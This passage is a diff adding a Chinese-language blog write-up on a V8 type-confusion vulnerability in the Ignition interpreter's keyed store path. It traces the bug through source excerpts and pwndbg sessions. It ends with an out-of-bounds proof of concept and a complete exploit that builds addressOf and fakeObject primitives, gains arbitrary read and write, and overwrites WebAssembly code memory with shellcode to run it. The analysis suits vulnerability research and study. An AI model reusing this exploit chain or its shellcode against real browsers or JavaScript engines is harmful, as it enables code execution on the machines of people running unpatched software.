+        RestartLookupForNonMaskingInterceptors&lt;is_element&gt;();
+        return;
+      &#125;
+      state_ = NOT_FOUND;
+      if (holder != *holder_) holder_ = handle(holder, isolate_);
+      return;
+    &#125;
+    holder = maybe_holder;
+    map = holder-&gt;map();
+    state_ = LookupInHolder&lt;is_element&gt;(map, holder);
+  &#125; while (!IsFound());
+
+  holder_ = handle(holder, isolate_);
+&#125;
+</code></pre>
+<p>其中NextHolder就是取出prototype对象，然后返回</p>
+<pre><code>JSReceiver LookupIterator::NextHolder(Map map) &#123;
+  DisallowHeapAllocation no_gc;
+  if (map-&gt;prototype() == ReadOnlyRoots(heap()).null_value()) &#123;
+    return JSReceiver();
+  &#125;
+  if (!check_prototype_chain() &amp;&amp; !map-&gt;has_hidden_prototype()) &#123;
+    return JSReceiver();
+  &#125;
+  return JSReceiver::cast(map-&gt;prototype());
+&#125;
+</code></pre>
+<p>调试如下</p>
+<pre><code>In file: /home/sea/Desktop/v8/src/lookup.cc
+   183 
+   184 template &lt;bool is_element&gt;
+   185 void LookupIterator::NextInternal(Map map, JSReceiver holder) &#123;
+   186   do &#123;
+   187     JSReceiver maybe_holder = NextHolder(map);
+ ► 188     if (maybe_holder.is_null()) &#123;
+   189       if (interceptor_state_ == InterceptorState::kSkipNonMasking) &#123;
+   190         RestartLookupForNonMaskingInterceptors&lt;is_element&gt;();
+pwndbg&gt; p/x map-&gt;ptr_
+$150 = 0x2deae918ce19
+pwndbg&gt; x /20gx 0x2deae918ce18
+0x2deae918ce18: 0x0000317690b81e59  0x0000080000000003
+0x2deae918ce28: 0x00002deae918cdf9  0x00002deae918cdf9
+0x2deae918ce38: 0xdeadbeedbeadbeef  0xdeadbeedbeadbeef
+pwndbg&gt; p/x maybe_holder-&gt;ptr_
+$152 = 0x2deae918cdf9
+pwndbg&gt; job 0x00002deae918cdf9
+c&quot;aaaaa..............
+</code></pre>
+<p>可以看到，这里取到了第四项，由于MAP是我们用字符串对象伪造的，因此取到的prototype对象是字符串对象中的第四项，而此处正好也是字符串对象<br>接下来调用<code>LookupInHolder</code>对当前prototype进行判断，是否符合要求。</p>
+<pre><code>   198     map = holder-&gt;map();
+ ► 199     state_ = LookupInHolder&lt;is_element&gt;(map, holder);
+   200   &#125; while (!IsFound());
+pwndbg&gt; job map-&gt;ptr_
+0x317690b81e59: [Map]
+ - type: CONS_ONE_BYTE_STRING_TYPE
+ - instance size: 32
+.......................
+</code></pre>
+<p>这次取到的MAP是字符串的MAP，会使用<code>LookupInSpecialHolder</code>进行处理,在LookupInSpecialHolder中调用了LookupInRegularHolder</p>
+<pre><code>In file: /home/sea/Desktop/v8/src/lookup.cc
+   1134             return DATA;
+   1135           case v8::internal::kAccessor:
+   1136             return ACCESSOR;
+   1137         &#125;
+   1138       &#125;
+ ► 1139       return LookupInRegularHolder&lt;is_element&gt;(map, holder);
+</code></pre>
+<p>主要逻辑仍然是将对应的elements取出来判断index是否在length范围内。</p>
+<pre><code>In file: /home/sea/Desktop/v8/src/lookup.cc
+   1160     JSObject js_object = JSObject::cast(holder);
+   1161     ElementsAccessor* accessor = js_object-&gt;GetElementsAccessor();
+   1162     FixedArrayBase backing_store = js_object-&gt;elements();
+   1163     number_ =
+   1164         accessor-&gt;GetEntryForIndex(isolate_, js_object, backing_store, index_);
+ ► 1165     if (number_ == kMaxUInt32) &#123;
+   1166       return holder-&gt;IsJSTypedArray() ? INTEGER_INDEXED_EXOTIC : NOT_FOUND;
+   1167     &#125;
+pwndbg&gt; p/x js_object-&gt;ptr_
+$157 = 0x2deae918cdf9
+pwndbg&gt; x /20gx 0x2deae918cdf8
+0x2deae918cdf8: 0x0000317690b81e59  0x0000040000000003
+0x2deae918ce08: 0x00002deae918cdd9  0x00002deae918cdd9
+0x2deae918ce18: 0x0000317690b81e59  0x0000080000000003
+0x2deae918ce28: 0x00002deae918cdf9  0x00002deae918cdf9
+........
+pwndbg&gt; p/x backing_store-&gt;ptr_
+$158 = 0x2deae918cdd9
+pwndbg&gt; x /20gx 0x2deae918cdd8
+0x2deae918cdd8: 0x0000317690b81e59  0x0000020000000003
+0x2deae918cde8: 0x00002deae918cdb9  0x00002deae918cdb9
+0x2deae918cdf8: 0x0000317690b81e59  0x0000040000000003
+0x2deae918ce08: 0x00002deae918cdd9  0x00002deae918cdd9
+0x2deae918ce18: 0x0000317690b81e59  0x0000080000000003
+0x2deae918ce28: 0x00002deae918cdf9  0x00002deae918cdf9
+...........
+pwndbg&gt; p number_
+$159 = 102
+</code></pre>
+<p>显然，这回条件是满足的，index在这个elements的length范围内，于是执行到后面，返回DATA</p>
+<pre><code>In file: /home/sea/Desktop/v8/src/lookup.cc
+   1181     property_details_ = dict-&gt;DetailsAt(number_);
+   1182   &#125;
+   1183   has_property_ = true;
+   1184   switch (property_details_.kind()) &#123;
+   1185     case v8::internal::kData:
+ ► 1186       return DATA;
+   1187     case v8::internal::kAccessor:
+   1188       return ACCESSOR;
+   1189   &#125;
+</code></pre>
+<p>这样<code>LookupIterator it =       LookupIterator::PropertyOrElement(isolate, object, key, &amp;success);</code>从prototype链上成功找到了合适的elements对象，然后回到<code>Runtime::SetObjectProperty</code>继续执行到这里</p>
+<pre><code>In file: /home/sea/Desktop/v8/src/runtime/runtime-object.cc
+   366                     NewTypeError(MessageTemplate::kInvalidPrivateFieldWrite,
+   367                                  name_string, object),
+   368                     Object);
+   369   &#125;
+   370 
+ ► 371   MAYBE_RETURN_NULL(
+   372       Object::SetProperty(&amp;it, value, store_origin, should_throw));
+   373 
+   374   return value;
+   375 &#125;
+</code></pre>
+<p>SetObjectProperty调用了<code>SetPropertyInternal</code>，</p>
+<pre><code>Maybe&lt;bool&gt; Object::SetPropertyInternal(LookupIterator* it,
+                                        Handle&lt;Object&gt; value,
+                                        Maybe&lt;ShouldThrow&gt; should_throw,
+                                        StoreOrigin store_origin, bool* found) &#123;
+  it-&gt;UpdateProtector();
+  DCHECK(it-&gt;IsFound());
+
+  // Make sure that the top context does not change when doing callbacks or
+  // interceptor calls.
+  AssertNoContextChange ncc(it-&gt;isolate());
+
+  do &#123;
+    switch (it-&gt;state()) &#123;
+      case LookupIterator::NOT_FOUND:
+        UNREACHABLE();
+......................
+
+      case LookupIterator::DATA:
+        if (it-&gt;IsReadOnly()) &#123;
+          return WriteToReadOnlyProperty(it, value, should_throw);
+        &#125;
+        if (it-&gt;HolderIsReceiverOrHiddenPrototype()) &#123;
+          return SetDataProperty(it, value);
+        &#125;
+        V8_FALLTHROUGH;
+      case LookupIterator::TRANSITION:
+.................
+    &#125;
+    it-&gt;Next();
+  &#125; while (it-&gt;IsFound());
+
+  *found = false;
+  return Nothing&lt;bool&gt;();
+&#125;
+</code></pre>
+<p>得饶过<code>it-&gt;IsReadOnly()</code>，其逻辑如下</p>
+<pre><code>bool IsReadOnly() const &#123; return property_details().IsReadOnly(); &#125;
+bool IsReadOnly() const &#123; return (attributes() &amp; READ_ONLY) != 0; &#125;
+</code></pre>
+<p>由于<code>property_details_</code>是在<code>LookupInRegularHolder</code>阶段创建的</p>
+<pre><code>template &lt;bool is_element&gt;
+LookupIterator::State LookupIterator::LookupInRegularHolder(
+    Map const map, JSReceiver const holder) &#123;
+...........
+  if (is_element) &#123;
+.........
+    if (number_ == kMaxUInt32) &#123;
+      return holder-&gt;IsJSTypedArray() ? INTEGER_INDEXED_EXOTIC : NOT_FOUND;
+    &#125;
+    property_details_ = accessor-&gt;GetDetails(js_object, number_);
+...............
+</code></pre>
+<p>而GetDetails函数如下</p>
+<pre><code>  PropertyDetails GetDetails(JSObject holder, uint32_t entry) final &#123;
+    return Subclass::GetDetailsImpl(holder, entry);
+  &#125;
+  static PropertyDetails GetDetailsImpl(JSObject holder, uint32_t entry) &#123;
+    return PropertyDetails(kData, NONE, PropertyCellType::kNoCell);
+  &#125;
+.............
+  PropertyDetails(PropertyKind kind, PropertyAttributes attributes,
+                  PropertyCellType cell_type, int dictionary_index = 0) &#123;
+    value_ = KindField::encode(kind) | LocationField::encode(kField) |
+             AttributesField::encode(attributes) |
+             DictionaryStorageField::encode(dictionary_index) |
+             PropertyCellTypeField::encode(cell_type);
+  &#125;
+</code></pre>
+<p>因此<code>attributes()</code>是0，是直接绕过了<code>it-&gt;IsReadOnly()</code>条件，那么现在，我们得满足<code>it-&gt;HolderIsReceiverOrHiddenPrototype()</code>条件，才能调用<code>SetDataProperty</code>。<br>HolderIsReceiverOrHiddenPrototype函数代码如下</p>
+<pre><code>bool LookupIterator::HolderIsReceiverOrHiddenPrototype() const &#123;
+  DCHECK(has_property_ || state_ == INTERCEPTOR || state_ == JSPROXY);
+  // Optimization that only works if configuration_ is not mutable.
+  if (!check_prototype_chain()) return true;
+  DisallowHeapAllocation no_gc;
+  if (*receiver_ == *holder_) return true;
+  if (!receiver_-&gt;IsJSReceiver()) return false;
+  JSReceiver current = JSReceiver::cast(*receiver_);
+  JSReceiver object = *holder_;
+  if (!current-&gt;map()-&gt;has_hidden_prototype()) return false;
+  // JSProxy do not occur as hidden prototypes.
+  if (object-&gt;IsJSProxy()) return false;
+  PrototypeIterator iter(isolate(), current, kStartAtPrototype,
+                         PrototypeIterator::END_AT_NON_HIDDEN);
+  while (!iter.IsAtEnd()) &#123;
+    if (iter.GetCurrent&lt;JSReceiver&gt;() == object) return true;
+    iter.Advance();
+  &#125;
+  return false;
+&#125;
+</code></pre>
+<p>其中的<code>if (!current-&gt;map()-&gt;has_hidden_prototype())</code>条件具有随机性，我们来看一下它是怎么判断的</p>
+<pre><code>BIT_FIELD_ACCESSORS(Map, bit_field3, has_hidden_prototype,
+                    Map::HasHiddenPrototypeBit)
+#define BIT_FIELD_ACCESSORS(holder, field, name, BitField)      \
+  typename BitField::FieldType holder::name() const &#123;           \
+    return BitField::decode(field());                           \
+  &#125;                                                             \
+  void holder::set_##name(typename BitField::FieldType value) &#123; \
+    set_##field(BitField::update(field(), value));              \
+  &#125;
+</code></pre>
+<p>主要就是取出<code>has_hidden_prototype</code>这个位进行判断，其中MAP布局如下</p>
+<pre><code> +---------------+---------------------------------------------+
+ |   _ Type _    | _ Description _                             |
+ +---------------+---------------------------------------------+
+ | TaggedPointer | map - Always a pointer to the MetaMap root  |
+ +---------------+---------------------------------------------+
+ | Int           | The first int field                         |
+  `---+----------+---------------------------------------------+
+      | Byte     | [instance_size]                             |
+      +----------+---------------------------------------------+
+      | Byte     | If Map for a primitive type:                |
+      |          |   native context index for constructor fn   |
+      |          | If Map for an Object type:                  |
+      |          |   inobject properties start offset in words |
+      +----------+---------------------------------------------+
+      | Byte     | [used_or_unused_instance_size_in_words]     |
+      |          | For JSObject in fast mode this byte encodes |
+      |          | the size of the object that includes only   |
+      |          | the used property fields or the slack size  |
+      |          | in properties backing store.                |
+      +----------+---------------------------------------------+
+      | Byte     | [visitor_id]                                |
+ +----+----------+---------------------------------------------+
+ | Int           | The second int field                        |
+  `---+----------+---------------------------------------------+
+      | Short    | [instance_type]                             |
+      +----------+---------------------------------------------+
+      | Byte     | [bit_field]                                 |
+      |          |   - has_non_instance_prototype (bit 0)      |
+      |          |   - is_callable (bit 1)                     |
+      |          |   - has_named_interceptor (bit 2)           |
+      |          |   - has_indexed_interceptor (bit 3)         |
+      |          |   - is_undetectable (bit 4)                 |
+      |          |   - is_access_check_needed (bit 5)          |
+      |          |   - is_constructor (bit 6)                  |
+      |          |   - has_prototype_slot (bit 7)              |
+      +----------+---------------------------------------------+
+      | Byte     | [bit_field2]                                |
+      |          |   - is_extensible (bit 0)                   |
+      |          |   - is_prototype_map (bit 1)                |
+      |          |   - is_in_retained_map_list (bit 2)         |
+      |          |   - elements_kind (bits 3..7)               |
+ +----+----------+---------------------------------------------+
+ | Int           | [bit_field3]                                |
+ |               |   - enum_length (bit 0..9)                  |
+ |               |   - number_of_own_descriptors (bit 10..19)  |
+ |               |   - is_dictionary_map (bit 20)              |
+ |               |   - owns_descriptors (bit 21)               |
+ |               |   - has_hidden_prototype (bit 22)           |
+ |               |   - is_deprecated (bit 23)                  |
+ |               |   - is_unstable (bit 24)                    |
+ |               |   - is_migration_target (bit 25)            |
+ |               |   - is_immutable_proto (bit 26)             |
+ |               |   - new_target_is_base (bit 27)             |
+ |               |   - may_have_interesting_symbols (bit 28)   |
+ |               |   - construction_counter (bit 29..31)       |
+ |               |                                             |
+ +*************************************************************+
+ | Int           | On systems with 64bit pointer types, there  |
+ |               | is an unused 32bits after bit_field3        |
+ +*************************************************************+
+ | TaggedPointer | [prototype]                                 |
+ +---------------+---------------------------------------------+
+ | TaggedPointer | [constructor_or_backpointer]                |
+ +---------------+---------------------------------------------+
+ | TaggedPointer | If Map is a prototype map:                  |
+ |               |   [prototype_info]                          |
+ |               | Else:                                       |
+ |               |   [raw_transitions]                         |
+ +---------------+---------------------------------------------+
+ | TaggedPointer | [instance_descriptors]                      |
+ +*************************************************************+
+ ! TaggedPointer ! [layout_descriptors]                        !
+ !               ! Field is only present if compile-time flag  !
+ !               ! FLAG_unbox_double_fields is enabled         !
+ !               ! (basically on 64 bit architectures)         !
+ +*************************************************************+
+ | TaggedPointer | [dependent_code]                            |
+ +---------------+---------------------------------------------+
+</code></pre>
+<p>与MAP对象的内存对应起来</p>
+<pre><code>pwndbg&gt; p/x current
+$178 = &#123;
+  &lt;v8::internal::HeapObject&gt; = &#123;
+    &lt;v8::internal::Object&gt; = &#123;
+      static kHeaderSize = 0x0, 
+      ptr_ = 0x61f6349ed01
+...................
+pwndbg&gt; x /20gx 0x61f6349ed00
+0x61f6349ed00:  0x00002deae918ce19  0x0000317690b80c21
+...................
+pwndbg&gt; x /20gx 0x00002deae918ce18
+0x2deae918ce18: 0x0000317690b81e59  0x0000080000000003
+0x2deae918ce28: 0x00002deae918cdf9  0x00002deae918cdf9
+..................
+</code></pre>
+<p>可以看到，对应<code>bit_field3</code>的位置是一个对象指针，因此，<code>bit_field3</code>的字段具有随机性，是有几率可以满足条件的。这也说明了<code>HolderIsReceiverOrHiddenPrototype</code>是可以到达条件真的情况。多次运行后，达到条件，接下来就会进入<code>SetDataProperty</code></p>
+<pre><code> ► 2529         if (it-&gt;HolderIsReceiverOrHiddenPrototype()) &#123;
+   2530           return SetDataProperty(it, value);
+   2531         &#125;
+pwndbg&gt; p it-&gt;HolderIsReceiverOrHiddenPrototype()
+$183 = true
+</code></pre>
+<p>SetDataProperty函数如下</p>
+<pre><code>Maybe&lt;bool&gt; Object::SetDataProperty(LookupIterator* it, Handle&lt;Object&gt; value) &#123;
+.....................
+  // Possibly migrate to the most up-to-date map that will be able to store
+  // |value| under it-&gt;name().
+  it-&gt;PrepareForDataProperty(to_assign);
+
+  // Write the property value.
+  it-&gt;WriteDataValue(to_assign, false);
+................
+&#125;
+</code></pre>
+<p>主要是调用了<code>it-&gt;WriteDataValue(to_assign, false);</code></p>
+<pre><code>void LookupIterator::WriteDataValue(Handle&lt;Object&gt; value,
+                                    bool initializing_store) &#123;
+  DCHECK_EQ(DATA, state_);
+  Handle&lt;JSReceiver&gt; holder = GetHolder&lt;JSReceiver&gt;();
+  if (IsElement()) &#123;
+    Handle&lt;JSObject&gt; object = Handle&lt;JSObject&gt;::cast(holder);
+    ElementsAccessor* accessor = object-&gt;GetElementsAccessor();
+    accessor-&gt;Set(object, number_, *value);
+  &#125; else if (holder-&gt;HasFastProperties()) &#123;
+..................
+&#125;
+</code></pre>
+<p>其中···accessor-&gt;Set(object, number_,<br>*value);···最终调用到的函数是<code>FixedArray::set</code></p>
+<pre><code>   126 void FixedArray::set(int index, Object value) &#123;
+ ► 127   DCHECK_NE(GetReadOnlyRoots().fixed_cow_array_map(), map());
+   128   DCHECK(IsFixedArray());
+   129   DCHECK_GE(index, 0);
+   130   DCHECK_LT(index, this-&gt;length());
+   131   int offset = kHeaderSize + index * kTaggedSize;
+   132   RELAXED_WRITE_FIELD(*this, offset, value);
+</code></pre>
+<p>从上可以看出，这里SetDataProperty实质是将LookupIterator中的holder_强制当成一个FixedArray，然后往对应的elements写数据。于是，我们可以直接越界写arr对象的length，从而构造一个OOB数组。<br>最终构造出的OOB POC（Release版本）</p>
+<pre><code>function fun() &#123;
+   var f = (v1 = (function() &#123;
+      let a = 0;
+      let b = 0;
+      if (a) &#123;
+         return;
+      &#125; else &#123;
+         return;
+      &#125;
+      (function() &#123;
+         print(&quot;f1&quot;);
+      &#125;);
+      (function() &#123;
+         print(&quot;f2&quot;);
+         //修改fun的MAP为b
+         b = &quot;a&quot;.repeat(0x800);
+         //修改arr指针为a
+         a = [1.1,2.2,3.3];
+      &#125;);
+   &#125;))=&gt;&#123;&#125;;
+   f();
+&#125;
+
+let arr = &#123;&#125;;
+
+function fun2() &#123;
+   fun();
+&#125;
+
+function fun3() &#123;
+   fun();
+&#125;
+
+fun2();
+//%DebugPrint(fun);
+//%SystemBreak();
+fun3();
+
+//%DebugPrint(arr);
+//%SystemBreak();
+
+fun[0x12] = -1;
+print(arr.length);
+</code></pre>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><pre><code>function fun() &#123;
+   var f = (v1 = (function() &#123;
+      let a = 0;
+      let obj_arr = 0;
+      let arr_buf = 0;
+      let b = 0;
+      if (a) &#123;
+         return;
+      &#125; else &#123;
+         return;
+      &#125;
+      (function() &#123;
+         print(&quot;f1&quot;);
+      &#125;);
+      (function() &#123;
+         print(&quot;f2&quot;);
+         //修改fun的MAP为b
+         b = &quot;a&quot;.repeat(0x800);
+         //修改arr指针为a
+         a = [1.1,2.2,3.3];
+         obj_arr = [&#123;&#125;];
+         arr_buf = new ArrayBuffer(0x1000);
+      &#125;);
+   &#125;))=&gt;&#123;&#125;;
+   f();
+&#125;
+
+let arr = &#123;&#125;;
+let obj_arr = &#123;&#125;;
+let arr_buf = &#123;&#125;;
+
+function fun2() &#123;
+   fun();
+&#125;
+
+function fun3() &#123;
+   fun();
+&#125;
+
+//生成错误的字节码
+fun2();
+//执行错误的字节码
+fun3();
+
+fun[0x12] = -1;
+print(&quot;[+] OOB length:&quot; + arr.length);
+
+/*%DebugPrint(arr);
+%DebugPrint(obj_arr);
+%SystemBreak();
+*/
+
+var buf = new ArrayBuffer(0x8);
+var dv = new DataView(buf);
+
+function p64f(value) &#123;
+   dv.setBigUint64(0,BigInt(value),true);
+   return dv.getFloat64(0,true);
+&#125;
+
+function u64f(value) &#123;
+   dv.setFloat64(0,value,true);
+   return dv.getBigUint64(0,true);
+&#125;
+
+function big2int(value) &#123;
+   dv.setBigUint64(0,BigInt(value),true);
+   return dv.getUint32(0,true);
+&#125;
+
+function addressOf(obj) &#123;
+   obj_arr[0] = obj;
+   return u64f(arr[0xe]) - 0x1n;
+&#125;
+
+function fakeObject(addr) &#123;
+   arr[0xe] = p64f(addr + 0x1n);
+   return obj_arr[0];
+&#125;
+
+
+var wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
+var shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);
+var wasmModule = new WebAssembly.Module(wasmCode);
+var wasmInstance = new WebAssembly.Instance(wasmModule);
+var func = wasmInstance.exports.main;
+
+var wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0x108n;
+print(&quot;[+] wasm_shellcode_ptr_addr=&quot; + wasm_shellcode_ptr_addr.toString(16));
+
+/*%DebugPrint(arr);
+%DebugPrint(arr_buf);
+%SystemBreak();
+*/
+
+arr[0x1c] = p64f(wasm_shellcode_ptr_addr);
+var adv = new DataView(arr_buf);
+var wasm_shellcode_addr = adv.getBigUint64(0,true);
+print(&#39;[+] wasm_shellcode_addr=&#39; + wasm_shellcode_addr.toString(16));
+
+arr[0x1c] = p64f(wasm_shellcode_addr);
+//替换wasm的shellcode
+for (var i=0;i&lt;shellcode.length;i++) &#123;
+   adv.setUint32(i*4,shellcode[i],true);
+&#125;
+//执行shellcode
+func();
+</code></pre>
+<p><img src="https://i.loli.net/2021/08/17/oxQVtZDi3qp8Yzs.png" alt="QQ20210817-105456\@2x.png"></p>
+<h2 id="0x03-感想"><a href="#0x03-感想" class="headerlink" title="0x03 感想"></a>0x03 感想</h2><p>通过这个漏洞，学习了V8的Iginition架构，对字节码的生成以及执行过程有了一定的了解，对虚拟机架构也有了一定的了解。对于IC缓存机制也有了一定的理解，这种方面的漏洞也是比较少见，牵涉到的知识面广，收获很多。</p>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/28590489">理解 V8 的字节码「译」</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/41496446">Ignition：V8解释器 「译」</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/96502646">V8是如何执行JavaScript代码的？</a><br>[Ignition: An Interpreter for V8<br><a target="_blank" rel="noopener" href="https://docs.google.com/presentation/d/1OqjVqRhtwlKeKfvMdX6HaCIu9wpZsrzqpIVIwQSuiXQ/edit#slide=id.g1357e6d1a4_0_58">BlinkOn]</a><br><a target="_blank" rel="noopener" href="https://www.infoq.cn/article/xJ6f3Uu2M7hEglEqmyNa">抛弃 V8 参数适配器框架：JavaScript 调用提速 40%<br>的实践</a> <a target="_blank" rel="noopener" href="https://v8.dev/blog/adaptor-frame">Faster<br>JavaScript calls</a> <a target="_blank" rel="noopener" href="https://p1umer.github.io/2018/07/10/V8-Iginition-Interpreter/">V8 Iginition<br>Interpreter &amp;&amp;<br>IC</a> <a target="_blank" rel="noopener" href="http://blog.topsec.com.cn/v8-cve-2019-5791%E6%A8%A1%E5%9D%97%E8%80%A6%E5%90%88%E5%AF%BC%E8%87%B4%E7%9A%84%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/">v8<br>cve-2019-5791:模块耦合导致的类型混淆</a><br><a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/chromium/issues/detail?id=926651">Issue 926651: Security: [v8] Type Confusion in<br>Builtins_CallUndefinedReceiver1Handler</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/JS%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E/" rel="tag"># JS引擎漏洞</a>
+              <a href="/ha1vk/tags/%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/" rel="tag"># 类型混淆</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2021/08/05/issues-1076708/" rel="prev" title="Issues-1076708 漏洞分析">
+      <i class="fa fa-chevron-left"></i> Issues-1076708 漏洞分析
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2021/10/17/bytectf2021-mediumdroid/" rel="next" title="bytectf2021_mediumdroid">
+      bytectf2021_mediumdroid <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">0x01 前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8E%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%B0%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-number">1.1.</span> <span class="nav-text">从源代码到字节码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B%E5%87%86%E5%A4%87"><span class="nav-number">1.1.1.</span> <span class="nav-text">流程准备</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ParseProgram-ParseProgram%E8%B0%83%E7%94%A8%E4%BA%86DoParseProgram%E6%9D%A5%E5%AE%8C%E6%88%90%E8%A7%A3%E6%9E%90%E7%9A%84%E4%BB%BB%E5%8A%A1"><span class="nav-number">1.1.2.</span> <span class="nav-text">ParseProgram ParseProgram调用了DoParseProgram来完成解析的任务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GenerateUnoptimizedCodeForToplevel"><span class="nav-number">1.1.3.</span> <span class="nav-text">GenerateUnoptimizedCodeForToplevel</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FinalizeUnoptimizedCompilationJob"><span class="nav-number">1.1.4.</span> <span class="nav-text">FinalizeUnoptimizedCompilationJob</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E8%8A%82%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">1.2.</span> <span class="nav-text">字节码执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%90%86%E8%A7%A3%E5%AD%97%E8%8A%82%E7%A0%81-%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%9E%B6%E6%9E%84"><span class="nav-number">1.3.</span> <span class="nav-text">理解字节码&#x2F;虚拟机架构</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">0x02 漏洞分析利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#patch-%E5%88%86%E6%9E%90"><span class="nav-number">2.1.</span> <span class="nav-text">patch 分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC%E6%9E%84%E9%80%A0"><span class="nav-number">2.2.</span> <span class="nav-text">POC构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#KeyedStoreIC"><span class="nav-number">2.3.</span> <span class="nav-text">KeyedStoreIC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.4.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%84%9F%E6%83%B3"><span class="nav-number">3.</span> <span class="nav-text">0x03 感想</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%82%E8%80%83"><span class="nav-number">4.</span> <span class="nav-text">0x04 参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
